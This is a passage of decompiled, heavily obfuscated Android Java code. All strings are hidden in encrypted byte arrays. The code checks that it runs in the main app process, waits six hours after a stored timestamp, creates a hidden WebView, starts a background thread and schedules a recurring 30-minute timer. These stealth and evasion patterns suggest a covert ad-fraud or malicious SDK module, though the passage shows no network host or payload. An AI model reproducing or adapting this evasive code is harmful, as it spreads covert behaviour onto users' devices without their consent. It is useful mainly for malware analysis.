            bArr7[4] = -120;
            bArr7[5] = 0;
            bArr7[6] = -42;
            bArr7[7] = -59;
            bArr7[8] = -106;
            bArr7[9] = 75;
            bArr7[10] = 9;
            bArr7[11] = -88;
            bArr7[12] = -6;
            bArr7[13] = 4;
            bArr7[14] = -60;
            bArr7[15] = -53;
            bArr7[16] = -104;
            bArr7[17] = 5;
            bArr7[18] = 70;
            byte[] bArr8 = new byte[8];
            bArr8[0] = -11;
            bArr8[1] = 63;
            bArr8[2] = 102;
            bArr8[3] = -38;
            bArr8[4] = -38;
            bArr8[5] = 101;
            bArr8[6] = -80;
            bArr8[7] = -92;
            lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(logLevel, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, sb.append(lllliiiill12.llllIIIIll1(bArr7, bArr8)).append(llllllIlIIIlll1.llllIIIIll1.llllIIIIll1().toJSONObject()).toString());
            byte[] bArr9 = new byte[24];
            bArr9[0] = 106;
            bArr9[1] = -48;
            bArr9[2] = -117;
            bArr9[3] = -89;
            bArr9[4] = -54;
            bArr9[5] = 72;
            bArr9[6] = 113;
            bArr9[7] = 90;
            bArr9[8] = 30;
            bArr9[9] = -118;
            bArr9[10] = -93;
            bArr9[11] = -34;
            bArr9[12] = -92;
            bArr9[13] = 79;
            bArr9[14] = 32;
            bArr9[15] = 1;
            bArr9[16] = 15;
            bArr9[17] = -20;
            bArr9[18] = -4;
            bArr9[19] = -6;
            bArr9[20] = -7;
            bArr9[21] = 42;
            bArr9[22] = 42;
            bArr9[23] = 125;
            byte[] bArr10 = new byte[8];
            bArr10[0] = -113;
            bArr10[1] = 109;
            bArr10[2] = 24;
            bArr10[3] = 66;
            bArr10[4] = 67;
            bArr10[5] = -59;
            bArr10[6] = -106;
            bArr10[7] = -25;
            lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(logLevel, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, lllliiiill12.llllIIIIll1(bArr9, bArr10).concat(IlIlIIIlIlIlll1.IlIlIIlIII1.llllIIIIll1(applicationContext)));
            llllIIIIll1(applicationContext);
            byte[] bArr11 = new byte[17];
            bArr11[0] = -74;
            bArr11[1] = 77;
            bArr11[2] = -59;
            bArr11[3] = 119;
            bArr11[4] = -83;
            bArr11[5] = -119;
            bArr11[6] = 115;
            bArr11[7] = 68;
            bArr11[8] = -80;
            bArr11[9] = 93;
            bArr11[10] = -19;
            bArr11[11] = 101;
            bArr11[12] = -73;
            bArr11[13] = -57;
            bArr11[14] = 70;
            bArr11[15] = 88;
            bArr11[16] = -69;
            byte[] bArr12 = new byte[8];
            bArr12[0] = -33;
            bArr12[1] = 62;
            bArr12[2] = -120;
            bArr12[3] = 22;
            bArr12[4] = -60;
            bArr12[5] = -25;
            bArr12[6] = 35;
            bArr12[7] = 54;
            lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(logLevel, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, lllliiiill12.llllIIIIll1(bArr11, bArr12));
            IlIllIlllIllI1.llllIIIIll1.lIllIIIlIl1();
            IlIllll1.lIIIIlllllIlll1.llllIIIIll1(applicationContext, IlIllIlllIllI1.llllIIIIll1.IlIlllIIlI1());
            byte[] bArr13 = new byte[8];
            bArr13[0] = -86;
            bArr13[1] = -106;
            bArr13[2] = -18;
            bArr13[3] = 48;
            bArr13[4] = 43;
            bArr13[5] = 34;
            bArr13[6] = -82;
            bArr13[7] = -6;
            byte[] bArr14 = new byte[8];
            bArr14[0] = -62;
            bArr14[1] = -7;
            bArr14[2] = -127;
            bArr14[3] = 91;
            bArr14[4] = 11;
            bArr14[5] = 71;
            bArr14[6] = -64;
            bArr14[7] = -98;
            lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(logLevel, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, lllliiiill12.llllIIIIll1(bArr13, bArr14));
            WebView[] webViewArr = new WebView[1];
            IlIlllIIlI1.lIIIIlllllIlll1.llllIIIIll1(new llllIIIIll1(webViewArr));
            SystemClock.sleep(2000L);
            if (webViewArr[0] == null) {
                return;
            }
            if (!IIIlIllIlI1.IlIlIIlIII1.IllIIlIIII1()) {
                byte[] bArr15 = new byte[43];
                bArr15[0] = 2;
                bArr15[1] = 40;
                bArr15[2] = -117;
                bArr15[3] = -123;
                bArr15[4] = 43;
                bArr15[5] = -13;
                bArr15[6] = 36;
                bArr15[7] = -86;
                bArr15[8] = 41;
                bArr15[9] = 105;
                bArr15[10] = -78;
                bArr15[11] = -58;
                bArr15[12] = 89;
                bArr15[13] = 115;
                bArr15[14] = -46;
                bArr15[15] = 100;
                bArr15[16] = -81;
                bArr15[17] = -105;
                bArr15[18] = 117;
                bArr15[19] = 81;
                bArr15[20] = -35;
                bArr15[21] = 39;
                bArr15[22] = -86;
                bArr15[23] = Byte.MAX_VALUE;
                bArr15[24] = -17;
                bArr15[25] = -14;
                bArr15[26] = 97;
                bArr15[27] = 56;
                bArr15[28] = -99;
                bArr15[29] = 46;
                bArr15[30] = -49;
                bArr15[31] = 45;
                bArr15[32] = -34;
                bArr15[33] = -78;
                bArr15[34] = 59;
                bArr15[35] = 56;
                bArr15[36] = -8;
                bArr15[37] = Byte.MAX_VALUE;
                bArr15[38] = -33;
                bArr15[39] = 82;
                bArr15[40] = -93;
                bArr15[41] = -126;
                bArr15[42] = 110;
                byte[] bArr16 = new byte[8];
                bArr16[0] = 74;
                bArr16[1] = 29;
                bArr16[2] = -35;
                bArr16[3] = -76;
                bArr16[4] = 121;
                bArr16[5] = -106;
                bArr16[6] = 66;
                bArr16[7] = -53;
                lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(logLevel, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, lllliiiill12.llllIIIIll1(bArr15, bArr16));
                return;
            }
            if (!llllIIIIll1()) {
                byte[] bArr17 = new byte[34];
                bArr17[0] = 13;
                bArr17[1] = -65;
                bArr17[2] = -39;
                bArr17[3] = 117;
                bArr17[4] = 83;
                bArr17[5] = -52;
                bArr17[6] = -10;
                bArr17[7] = -35;
                bArr17[8] = 38;
                bArr17[9] = -2;
                bArr17[10] = -32;
                bArr17[11] = 54;
                bArr17[12] = 33;
                bArr17[13] = -64;
                bArr17[14] = -2;
                bArr17[15] = -43;
                bArr17[16] = 49;
                bArr17[17] = -86;
                bArr17[18] = -44;
                bArr17[19] = 101;
                bArr17[20] = 98;
                bArr17[21] = -63;
                bArr17[22] = -11;
                bArr17[23] = -33;
                bArr17[24] = 46;
                bArr17[25] = -55;
                bArr17[26] = -18;
                bArr17[27] = 42;
                bArr17[28] = 83;
                bArr17[29] = -36;
                bArr17[30] = -2;
                bArr17[31] = -108;
                bArr17[32] = 108;
                bArr17[33] = -41;
                byte[] bArr18 = new byte[8];
                bArr18[0] = 69;
                bArr18[1] = -118;
                bArr18[2] = -113;
                bArr18[3] = 68;
                bArr18[4] = 1;
                bArr18[5] = -87;
                bArr18[6] = -112;
                bArr18[7] = -68;
                lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(Log.LogLevel.ERROR, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, lllliiiill12.llllIIIIll1(bArr17, bArr18));
                return;
            }
            IlIlIIlIII1();
            byte[] bArr19 = new byte[26];
            bArr19[0] = -80;
            bArr19[1] = 31;
            bArr19[2] = -60;
            bArr19[3] = -112;
            bArr19[4] = -116;
            bArr19[5] = 26;
            bArr19[6] = 96;
            bArr19[7] = -63;
            bArr19[8] = -70;
            bArr19[9] = 3;
            bArr19[10] = -14;
            bArr19[11] = -102;
            bArr19[12] = Byte.MIN_VALUE;
            bArr19[13] = 84;
            bArr19[14] = 104;
            bArr19[15] = -61;
            bArr19[16] = -70;
            bArr19[17] = 25;
            bArr19[18] = -58;
            bArr19[19] = -96;
            bArr19[20] = -125;
            bArr19[21] = 81;
            bArr19[22] = 41;
            bArr19[23] = -54;
            bArr19[24] = -67;
            bArr19[25] = 19;
            byte[] bArr20 = new byte[8];
            bArr20[0] = -45;
            bArr20[1] = 119;
            bArr20[2] = -95;
            bArr20[3] = -13;
            bArr20[4] = -25;
            bArr20[5] = 58;
            bArr20[6] = 9;
            bArr20[7] = -81;
            lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(logLevel, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, lllliiiill12.llllIIIIll1(bArr19, bArr20));
            lIIIIlllllIlll1();
            byte[] bArr21 = new byte[21];
            bArr21[0] = 106;
            bArr21[1] = 3;
            bArr21[2] = -125;
            bArr21[3] = -59;
            bArr21[4] = -68;
            bArr21[5] = 28;
            bArr21[6] = -120;
            bArr21[7] = 71;
            bArr21[8] = 90;
            bArr21[9] = 2;
            bArr21[10] = -127;
            bArr21[11] = -56;
            bArr21[12] = -74;
            bArr21[13] = 34;
            bArr21[14] = -108;
            bArr21[15] = 71;
            bArr21[16] = 110;
            bArr21[17] = 75;
            bArr21[18] = -125;
            bArr21[19] = -56;
            bArr21[20] = -77;
            byte[] bArr22 = new byte[8];
            bArr22[0] = 9;
            bArr22[1] = 107;
            bArr22[2] = -26;
            bArr22[3] = -90;
            bArr22[4] = -41;
            bArr22[5] = 78;
            bArr22[6] = -3;
            bArr22[7] = 41;
            lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(logLevel, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, lllliiiill12.llllIIIIll1(bArr21, bArr22));
            new Thread(new lIIIIlllllIlll1()).start();
            IlIlIIlIII1 ilIlIIlIII1 = new IlIlIIlIII1();
            byte[] bArr23 = new byte[28];
            bArr23[0] = 32;
            bArr23[1] = 53;
            bArr23[2] = -3;
            bArr23[3] = -26;
            bArr23[4] = 108;
            bArr23[5] = 67;
            bArr23[6] = -28;
            bArr23[7] = -79;
            bArr23[8] = 11;
            bArr23[9] = 116;
            bArr23[10] = -60;
            bArr23[11] = -91;
            bArr23[12] = 30;
            bArr23[13] = 82;
            bArr23[14] = -29;
            bArr23[15] = -93;
            bArr23[16] = 3;
            bArr23[17] = 32;
            bArr23[18] = -40;
            bArr23[19] = -93;
            bArr23[20] = 95;
            bArr23[21] = 84;
            bArr23[22] = -10;
            bArr23[23] = -113;
            bArr23[24] = 55;
            bArr23[25] = 95;
            bArr23[26] = -12;
            bArr23[27] = -120;
            byte[] bArr24 = new byte[8];
            bArr24[0] = 104;
            bArr24[1] = 0;
            bArr24[2] = -85;
            bArr24[3] = -41;
            bArr24[4] = 62;
            bArr24[5] = 38;
            bArr24[6] = -126;
            bArr24[7] = -48;
            lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(logLevel, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, lllliiiill12.llllIIIIll1(bArr23, bArr24));
            ilIlIIlIII1.llllIIIIll1(webViewArr[0]);
            new Timer().schedule(new C0009llllIllIl1(), 1800000L, 1800000L);
        } catch (Throwable th) {
            lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(Log.LogLevel.ERROR, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1.llllIIIIll1(new byte[]{-81, 71, 40, 54, 6, 9, 74, 75, -124, 6, 17, 117, 116, 5, 66, 67, -109, 82, 27, 117, 38, 3, 94, 16, -57}, new byte[]{-25, 114, 126, 7, 84, 108, 44, 42}) + th.getMessage());
        }
    }

    public final boolean llllIIIIll1() {
        if (IlIlllIIlI1.lIIIIlllllIlll1.IlIlIIlIII1() || this.f267llllllIlIIIlll1.equals(f260IIlIllIIll1)) {
            return true;
        }
        IllIIlIIII1.llllIIIIll1 lllliiiill1 = IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1;
        String llllIIIIll12 = IIlIllIIll1.llllIIIIll1(this.f261llllIIIIll1, lllliiiill1.llllIIIIll1(new byte[]{-96, 72, -1, -119, -86, 9, 119, 65, -98, 125, -27, -112, Byte.MIN_VALUE, 36, 116, 93}, new byte[]{-20, 41, -116, -3, -27, 111, 17, 36}));
        if (llllIIIIll12 == null) {
            return true;
        }
        try {
            if (llllIIIIll12.isEmpty()) {
                return true;
            }
            String trim = llllIIIIll12.trim();
            byte[] bArr = new byte[3];
            bArr[0] = -41;
            bArr[1] = 103;
            bArr[2] = 98;
            byte[] bArr2 = new byte[8];
            bArr2[0] = -117;
            bArr2[1] = 3;
            bArr2[2] = 73;
            bArr2[3] = -125;
            bArr2[4] = 30;
            bArr2[5] = -22;
            bArr2[6] = -63;
            bArr2[7] = 28;
            if (!Pattern.matches(lllliiiill1.llllIIIIll1(bArr, bArr2), trim)) {
                return true;
            }
            long parseLong = Long.parseLong(trim);
            boolean z = new Date().getTime() - parseLong >= 21600000;
            if (!z) {
                lllllIllIl1.lIIIIlllllIlll1 liiiilllllilll1 = lllllIllIl1.lIIIIlllllIlll1.f773llllllIlIIIlll1;
                String str = lllllIllIl1.llllIIIIll1.f793lllllIllIl1.f796llllIIIIll1;
                StringBuilder sb = new StringBuilder();
                byte[] bArr3 = new byte[35];
                bArr3[0] = -31;
                bArr3[1] = -88;
                bArr3[2] = 54;
                bArr3[3] = -117;
                bArr3[4] = 14;
                bArr3[5] = 125;
                bArr3[6] = -69;
                bArr3[7] = -22;
                bArr3[8] = -54;
                bArr3[9] = -23;
                bArr3[10] = 15;
                bArr3[11] = -56;
                bArr3[12] = 124;
                bArr3[13] = 123;
                bArr3[14] = -75;
                bArr3[15] = -18;
                bArr3[16] = -54;
                bArr3[17] = -10;
                bArr3[18] = 64;
                bArr3[19] = -50;
                bArr3[20] = 53;
                bArr3[21] = 117;
                bArr3[22] = -72;
                bArr3[23] = -17;
                bArr3[24] = -119;
                bArr3[25] = -14;
                bArr3[26] = 21;
                bArr3[27] = -50;
                bArr3[28] = 112;
                bArr3[29] = 56;
                bArr3[30] = -78;
                bArr3[31] = -25;
                bArr3[32] = -51;
                bArr3[33] = -89;
                bArr3[34] = 64;
                byte[] bArr4 = new byte[8];
                bArr4[0] = -87;
                bArr4[1] = -99;
                bArr4[2] = 96;
                bArr4[3] = -70;
                bArr4[4] = 92;
                bArr4[5] = 24;
                bArr4[6] = -35;
                bArr4[7] = -117;
                StringBuilder append = sb.append(lllliiiill1.llllIIIIll1(bArr3, bArr4)).append(parseLong);
                byte[] bArr5 = new byte[7];
                bArr5[0] = -90;
                bArr5[1] = 126;
                bArr5[2] = -87;
                bArr5[3] = 62;
                bArr5[4] = -34;
                bArr5[5] = -79;
                bArr5[6] = -89;
                byte[] bArr6 = new byte[8];
                bArr6[0] = -118;
                bArr6[1] = 94;
                bArr6[2] = -57;
                bArr6[3] = 81;
                bArr6[4] = -87;
                bArr6[5] = -117;
                bArr6[6] = -121;
                bArr6[7] = 45;
                liiiilllllilll1.llllIIIIll1(str, append.append(lllliiiill1.llllIIIIll1(bArr5, bArr6)).append(new Date().getTime()).toString());
            }
            return z;
        } catch (Exception e) {
            lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(Log.LogLevel.ERROR, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, llllIIIIll1.lIIIIlllllIlll1.llllIIIIll1(e, new StringBuilder().append(IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1.llllIIIIll1(new byte[]{Byte.MIN_VALUE, 90, 16, -49, 95, 113, 90, -18, -85, 27, 41, -116, 45, 119, 84, -22, -85, 4, 5, -97, 99, 70, 73, -31, -24, 10, 52, -116, 98, 102, 6, -81}, new byte[]{-56, 111, 70, -2, 13, 20, 60, -113}))));
            return true;
        }
    }

    public final boolean llllIIIIll1(Context context) {
        int myPid = Process.myPid();
        String str = lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1;
        Iterator<ActivityManager.RunningAppProcessInfo> it = ((ActivityManager) context.getSystemService(IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1.llllIIIIll1(new byte[]{2, -102, 75, 15, 93, 124, 41, 56}, new byte[]{99, -7, 63, 102, 43, 21, 93, 65}))).getRunningAppProcesses().iterator();
        while (true) {
            if (!it.hasNext()) {
                break;
            }
            ActivityManager.RunningAppProcessInfo next = it.next();
            if (next.pid == myPid) {
                str = next.processName;
                break;
            }
        }
        String packageName = context.getPackageName();
        IllIIlIIII1.llllIIIIll1 lllliiiill1 = IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1;
        lllllIllIl1.IllIIlIIII1.lIIIIlllllIlll1(Log.LogLevel.INFO, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, llllIIIIll1.llllIIIIll1.llllIIIIll1(lllliiiill1, new byte[]{52, -82, 93, -53, 89, -103, 80, 106, 103, -95, 51, -38, 70, -109, 9, 47}, new byte[]{20, -46, 125, -69, 43, -10, 51, 15}, new StringBuilder().append(lllliiiill1.llllIIIIll1(new byte[]{-18, -115, -72, -61, -51, -39, -7, 27, -26, -97, -94, -29, -4, -58, -13, 66, -93}, new byte[]{-125, -20, -47, -83, -99, -85, -106, 120})).append(packageName), str));
        this.f263llllIllIl1 = str;
        return str.equals(packageName);
    }
}
